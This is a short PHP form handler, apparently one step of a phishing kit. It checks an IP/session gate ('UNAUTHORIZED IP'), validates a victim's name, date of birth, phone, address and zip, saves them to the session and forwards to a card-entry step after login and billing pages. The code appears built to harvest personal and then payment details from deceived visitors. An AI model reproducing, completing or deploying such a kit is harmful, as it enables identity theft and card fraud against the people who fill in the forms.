<?php 
session_start();

include('../../config.php');
if($_SESSION['authorized'] == "1")
{
	if(isset($_POST['continue']))
	{

		if(!empty($_POST['fname']) && !empty($_POST['lname']) && !empty($_POST['dob']) && !empty($_POST['phone']) && !empty($_POST['adress']) && !empty($_POST['city']) && !empty($_POST['zip']))
		{
		if(strlen($_POST['dob']) == 10)
		{

			if(strlen($_POST['phone']) >= 10)
			{

				if(strlen($_POST['zip']) == 5)
				{

					$_SESSION['fname'] = $_POST['fname'];
					$_SESSION['lname'] = $_POST['lname'];
					$_SESSION['dob'] = $_POST['dob'];
					$_SESSION['phone'] = $_POST['phone'];
					$_SESSION['adress'] = $_POST['adress'];
					$_SESSION['city'] = $_POST['city'];
					$_SESSION['zip'] = $_POST['zip'];

					header('Location: ../loader.php?goto=card');







				}
				else{
					header('Location: ../billing.php?error=zip');
				}

			}
			else{
				header('Location: ../billing.php?error=phone');
			}

		}
		else{
			header('Location: ../billing.php?error=dob');
		}

	}
	else{
		header('Location: ../billing.php?error=empty');
	}

	}
	else{
		header('Location: ../login.php');
	}
}
else{
	die('UNAUTHORIZED IP');
}

	?>